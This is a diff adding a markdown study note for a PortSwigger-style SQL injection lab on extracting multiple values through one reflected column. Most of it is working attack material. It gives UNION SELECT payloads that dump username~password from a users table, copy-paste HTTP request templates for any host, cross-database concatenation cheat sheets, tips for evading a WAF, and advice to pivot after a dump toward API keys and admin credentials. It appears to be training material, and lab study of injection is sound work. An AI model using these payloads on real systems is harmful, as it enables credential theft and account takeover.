@@ -717,3 +717,215 @@ GET /filter?category=Techgifts' UNION SELECT NULL,group_concat(concat(username,'
 - *Tools:* sqlmap (use with care and throttle).
 
 ---
+
+# SQLi Lab-6 — Retrieve multiple values in a single column 
+
+---
+
+🔹 *One-line summary*
+
+When an injection point only reflects one column, concatenate multiple fields (e.g., username~password) into that single reflected column using a UNION injection to exfiltrate multiple values at once.
+
+---
+
+🔹 *1️⃣ Why this matters (impact)*
+
+- Enables credential theft even if only one column is displayed.  
+- Leads to fast account takeover or privilege escalation.  
+- Useful for real-world web apps where complete rows aren’t reflected.
+
+---
+
+🔹 *2️⃣ High-value endpoints to test*
+
+1. /filter?category=..., /products?category=... — category / listing pages  
+2. /search?q=... — search results  
+3. Admin or reporting panels displaying DB data  
+4. CSV / export or legacy API endpoints  
+5. Any parameter that outputs DB-driven content into HTML or JSON
+
+---
+
+🔹 *3️⃣ Quick checklist (what to try)*
+
+1. Inject ' — look for SQL errors.  
+2. Find column count → UNION SELECT NULL, ... until valid.  
+3. Find string-reflecting column → inject token 'TOK' in each column.  
+4. Use concatenation in that column → combine username & password.  
+5. For multiple rows → use GROUP_CONCAT() or string_agg().
+
+---
+
+🔹 *4️⃣ Exact step-by-step methodology (PortSwigger lab-style)*
+
+*A — Capture & prepare*
+
+1. Turn *Burp Proxy ON* and capture the request of the results page (category/search).  
+2. Send it to *Repeater* for testing.
+
+---
+
+*B — Find number of columns (N)*
+
+Try incrementing NULLs:
+
+' UNION SELECT NULL-- ' UNION SELECT NULL,NULL-- ' UNION SELECT NULL,NULL,NULL--
+
+✅ The NULL count that returns a normal (non-error) page is your correct N.
+
+---
+
+*C — Find which column reflects string data*
+
+Test each column by injecting a token in one column at a time:
+
+' UNION SELECT 'TOK',NULL,NULL-- ' UNION SELECT NULL,'TOK',NULL-- ' UNION SELECT NULL,NULL,'TOK'--
+
+Then check the *response HTML*.  
+The column that visibly reflects TOK supports string output.
+
+---
+
+*D — Concatenate username & password (PortSwigger example)*
+
+If reflected column is 2 of 2:
+
+' UNION SELECT NULL, username || '~' || password FROM users--
+
+Then inspect raw HTML for:
+
+administrator~s3cure
+
+➡ Copy credentials and test login.
+
+---
+
+*E — If only one column is reflected (MySQL example)*
+
+' UNION SELECT CONCAT(username,'~',password) FROM users--
+
+---
+
+*F — If many rows are returned (aggregate them)*
+
+MySQL aggregation example:
+
+' UNION SELECT GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR 0x0a) FROM users--
+
+---
+
+# 🧾 Proof / Evidence
+
+1️⃣ *Screenshot — NULL count discovery*  
+![NULL count discovery](../images/sqli-concat-null-count.png)  
+🖼 Description: Shows Repeater request where UNION SELECT NULL,... payload returns a valid page — confirms correct column count (N).
+
+---
+
+2️⃣ *Screenshot — Reflected string column detection*  
+![Reflected string column detection](../images/sqli-concat-string-col.png)  
+🖼 Description: Displays visible 'TOK' token in the response after testing each column — identifies which column accepts string data.
+
+---
+
+3️⃣ *Screenshot — Final concatenation result (username~password)*  
+![Final concatenation result](../images/sqli-concat-final-result.png) 
+🖼 Description: Repeater response showing administrator~s3cure after injecting:  
+' UNION SELECT CONCAT(username,'~',password) FROM users--  
+✅ Confirms successful concatenation-based SQLi and credential extraction.
+
+---
+
+🔹 *5️⃣ PortSwigger concat format*
+
+Use this standard syntax:
+
+username || '~' || password
+
+✅ Works for *PostgreSQL / Oracle* style DBs.
+
+---
+
+🔹 *6️⃣ Concatenation & aggregation — DB syntax cheat sheet*
+
+| DB | Concatenation | Aggregation |
+|----|----------------|-------------|
+| MySQL / MariaDB | CONCAT(a,'~',b) | GROUP_CONCAT(CONCAT(a,':',b)) |
+| PostgreSQL | a || '~' || b | string_agg(a || ':' || b, E'\\n') |
+| Oracle | a || '~' || b (may need FROM DUAL) | — |
+| MSSQL | a + '~' + b or CONCAT(a,'~',b) | — |
+| SQLite | a || '~' || b | — |
+
+---
+
+🔹 *7️⃣ Copy-paste payload templates*
+
+> Replace <HOST> and <CATEGORY>; adjust NULL positions for correct reflected column.
+
+*PortSwigger-style (column 2 of 2):*
+
+GET /filter?category=<CATEGORY>' UNION SELECT NULL, username || '~' || password FROM users-- HTTP/1.1 Host: <HOST>
+
+*MySQL (column 2 of 2):*
+
+GET /filter?category=<CATEGORY>' UNION SELECT NULL, CONCAT(username,'~',password) FROM users-- HTTP/1.1 Host: <HOST>
+
+*Single-column reflected (MySQL):*
+
+GET /filter?category=<CATEGORY>' UNION SELECT CONCAT(username,'~',password)-- HTTP/1.1 Host: <HOST>
+
+*Aggregate multiple rows (MySQL):*
+
+' UNION SELECT NULL, GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR 0x0a) FROM users--
+
+---
+
+🔹 *8️⃣ Troubleshooting (common fixes)*
+
+- ❌ 500 error → wrong NULL count or mismatched column types.  
+- ❌ No visible token → view raw HTML, attributes, or JS comments.  
+- ❌ Output truncated → use GROUP_CONCAT() or chunked extraction (SUBSTRING, LIMIT, OFFSET).  
+- ❌ WAF blocks UNION → obfuscate (UN/**/ION, UNI%0AON) or build strings via CHAR()/CHR().
+
+---
+
+🔹 *9️⃣ Fixes / remediation (for report)*
+
+✅ Use parameterized queries / prepared statements.  
+✅ Remove DB error messages from client responses.  
+✅ Whitelist inputs (only valid categories, IDs, etc.).  
+✅ Limit DB privileges (no FILE / EXEC rights).  
+✅ Monitor & alert for UNION / ORDER BY / SLEEP probes.
+
+---
+
+🔹 *🔟 Out-of-the-box / advanced notes*
+
+- Fingerprint DB:  
+  ' UNION SELECT @@version-- or version()  
+- Use information_schema to discover tables & columns.  
+- Split large dumps with LIMIT / OFFSET.  
+- Post-dump pivot → look for API keys, admin creds, or internal hosts.  
+- Use *sqlmap* only after manual validation.
+
+---
+
+🔹 *Extended concatenation cheat-sheet (extra DBs)*
+
+| DB | Example |
+|----|----------|
+| DB2 / Informix | username || '~' || password |
+| Sybase | username + '~' + password |
+| Teradata | username || '~' || password or CONCAT() |
+| Presto / Trino | CONCAT(username, '~', password) or || |
+| Hive | CONCAT(username, '~', password) |
+
+🧩 Tip: Always verify the concat operator first using small tests like || 'X' ||.
+
+---
+
+🔹 *Pocket cue*
+
+Count NULLs → find reflected column → concat(username~password) → get admin → login.
+
+---
